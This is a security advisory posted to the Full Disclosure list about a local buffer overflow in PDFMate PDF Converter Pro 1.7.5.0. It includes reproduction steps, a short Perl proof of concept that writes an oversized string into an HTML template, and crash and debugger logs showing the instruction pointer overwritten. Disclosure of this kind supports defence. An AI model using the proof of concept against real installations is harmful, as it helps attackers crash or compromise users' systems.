
Date: Mon, 20 Feb 2017 11:10:58 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] PDFMate PDF Converter Pro 1.7.5.0 - Buffer Overflow
	Vulnerability

Document Title:
===============
PDFMate PDF Converter Pro 1.7.5.0 - Buffer Overflow Vulnerability


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2029


Release Date:
=============
2017-01-30


Vulnerability Laboratory ID (VL-ID):
====================================
2029


Common Vulnerability Scoring System:
====================================
5.9


Product & Service Introduction:
===============================
PDFMate PDF Converter Professional is a comprehensive PDF conversion application. It can also be used as PDF splitter and PDF Merger.
PDFMate PDF Converter is easy to use with simple and clear program interface.

( Copy of the Vendor Homepage: http://www.pdfmate.com/ )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a local buffer overflow vulnerability in the PDFMate PDF Converter Professional v1.7.5.0 software.


Vulnerability Disclosure Timeline:
==================================
2017-01-30: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
PDFMate
Product: PDF Converter Pro & Free - Software 1.7.5.0


Exploitation Technique:
=======================
Local


Severity Level:
===============
High


Technical Details & Description:
================================
A local buffer overflow vulnerability has been discovered in the official PDFMate PDF Converter Professional v1.7.5.0 software.
The local vulnerability allows local attackers to overwrite the registers to compromise the local software system process.

The `Convert_Pro.dll` file in the `C:Program FilesAnvsoftPDFMate PDF Converter Professional` path is vulnerable to a local 
buffer overflow. In case of a `html` file convert the `convert_pro` dynamic link library is used to create the file in the 
last instance with the already set conditions. Local attackers with restricted system privileges are able to include large 
unicode strings to the html template files of the `htmltemplate` folder. Local attackers are finally able to exploit the 
process by an overwrite of the registers to gain higher system access privileges.

The security risk of the vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 5.9.
Exploitation of the vulnerability requires a low privilege or restricted system user account without user interaction. 
Successful exploitation of the vulnerability results in process manipulation or compromise of the affected computer system.

Vulnerable Module(s):
[+] Convert_Pro.dll


Proof of Concept (PoC):
=======================
The vulnerability can be exploited by local attackers without user interaction and with low system user account.
For security demonstration or to reproduce the issue follow the provided information and steps below to continue.


Manual steps to reproduce ...
1. Install the software
2. Move into the htmltemplate path
3. Modify the index.html main template file that is used to generate the html file of a pdf
4. Include a large unicode payload inside of the file header and save
5. Start the software (PDFMatePro.exe)
6. Add a random pdf file and choose at buttom the html function
7. Click the convert button
8. The software process crashs because of the processing the large unicode payload via Convert_Pro.dll
9. Successful reproduce of the local buffer overflow vulnerability!


PoC: Exploitation
#!/usr/bin/perl
my $Buff = "x41" x 4141;
open(MYFILE,'>>index.html');
print MYFILE $Buff;
close(MYFILE);
print "Replace Index Template File";


PoC: Vulnerable Source (Template File)
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN">
<head>
<title>[LARGE UNICODE PAYLOAD AAAAAAAAAA...+]</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<script type="text/javascript" src="./html/index.js"> </script>
</head>
<frameset rows="37,*" border="0" framespacing="1" frameborder="0">
<frame name="toolbarWin" src="./html/toolbar.html" noresize="noresize" scrolling="no" />
<frameset cols="134,*" id="mainframe" border="0" framespacing="1" frameborder="0">
<frameset rows="30,*" border="0" framespacing="1" frameborder="0">
<frame name="navorbmimg" src="./html/navimg.html" noresize="noresize" scrolling="no" />
<frame name="navorbm" src="./html/navigation.html" noresize="noresize" />
<frame src=a>
</frameset>
<frame name="content" src="./html/P1.html" noresize="noresize" />
</frameset>
<noframes>
<body>
<p>This page includes frames, and your browser does not work with it.</p>
</body>
</noframes>
</frameset>
</html>

Note: Do not modify the file content outside the title content because of the template is 
checked by the software and is required to run functional.


--- System Error Event Logs ---
EventType=BEX
EventTime=131292452808589892
ReportType=2
Consent=1
UploadTime=131292452809373704
ReportIdentifier=88fcfb1a-ddbd-11e6-8a7d-ebe9983f0e19
IntegratorReportIdentifier=735fd6bc-fef1-43ea-ae50-011d10d60eff
WOW64=1
NsAppName=PDFMatePro.exe
AppSessionGuid=00001598-0004-005a-0581-d452c971d201
TargetAppId=W:0000da39a3ee5e6b4b0d3255bfef95601890afd80709!0000da39a3ee5e6b4b0d3255bfef95601890afd80709!PDFMatePro.exe
TargetAppVer=2015//03//06:06:34:59!7b77cc!PDFMatePro.exe
BootId=4294967295
Response.BucketId=046d5833e2cfeab779378428212916e8
Response.BucketTable=1
Response.LegacyBucketId=108693211846
Response.type=4
Sig[0].Name=Anwendungsname
Sig[0].Value=PDFMatePro.exe
Sig[1].Name=Anwendungsversion
Sig[1].Value=1.7.5.0
Sig[2].Name=Anwendungszeitstempel
Sig[2].Value=54f94a93
Sig[3].Name=Fehlermodulname
Sig[3].Value=Convert_Pro.dll
Sig[4].Name=Fehlermodulversion
Sig[4].Value=0.0.0.0
Sig[5].Name=Fehlermodulzeitstempel
Sig[5].Value=41414141
Sig[6].Name=Ausnahmecode
Sig[6].Value=c0000005
Sig[7].Name=Ausnahmeoffset
Sig[7].Value=0003747b
DynamicSig[1].Name=Betriebsystemversion
DynamicSig[1].Value=10.0.14393.2.0.0.256.48
DynamicSig[2].Name=Gebietsschema-ID
DynamicSig[2].Value=1031
DynamicSig[22].Name=Zusatzinformation 1
DynamicSig[22].Value=2beb
DynamicSig[23].Name=Zusatzinformation 2
DynamicSig[23].Value=2beba6fb4680d73a8c78ca7c24ccdb46
DynamicSig[24].Name=Zusatzinformation 3
DynamicSig[24].Value=1055
DynamicSig[25].Name=Zusatzinformation 4
DynamicSig[25].Value=10551cc64bcfba7d2297b81a9c0092f2
UI[2]=C:Program Files (x86)AnvsoftPDFMate PDF Converter ProfessionalPDFMatePro.exe
UI[3]=PDFMate PDF Converter Professional funktioniert nicht mehr
UI[4]=Windows kann online nach einer Lösung für das Problem suchen und versuchen, das Programm neu zu starten.
UI[5]=Online nach einer Lösung suchen und das Programm neu starten
UI[6]=Später online nach einer Lösung suchen und das Programm schließen
UI[7]=Programm schließen
...	...
State[0].Key=Transport.DoneStage1
State[0].Value=1
FriendlyEventName=Nicht mehr funktionsfähig
ConsentKey=APPCRASH
AppName=PDFMate PDF Converter Professional
AppPath=C:Program Files (x86)AnvsoftPDFMate PDF Converter ProfessionalPDFMatePro.exe
ApplicationIdentity=C9B25CD652BEC246D013BC2528E51FBA
MetadataHash=1654607508


-- Exception Debug Logs ---
Convert_Pro!HtmlBook::BuildIndex+762b
41414141 8b10            mov     edx,dword ptr [eax]
-
ExceptionAddress: 41414141 (Convert_Pro!HtmlBook::BuildIndex+0x000000000000762b)
   ExceptionCode: c0000005 (Access violation)
NumberParameters: 2
   Parameter[0]: 0000000000823502
   Parameter[1]: 0000000000650072
Attempt to read from address 0000000000650072
-
eax=00650072 ebx=0767efbc ecx=07830990 edx=6fc6c278 esi=0767e998 edi=07830990
eip=41414141 esp=0767a884 ebp=41414141 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
Convert_Pro!HtmlBook::BuildIndex+0x762b:
41414141 8b10            mov     edx,dword ptr [eax]  ds:002b:00650072=????????


Security Risk:
==============
The security risk of the local buffer overflow vulnerability in the software is estimated as high. (CVSS 5.9)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri [http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, 
deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com
Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php

Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get a ask permission.

				    Copyright © 2017 | Vulnerability Laboratory - [Evolution Security GmbH]™

-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/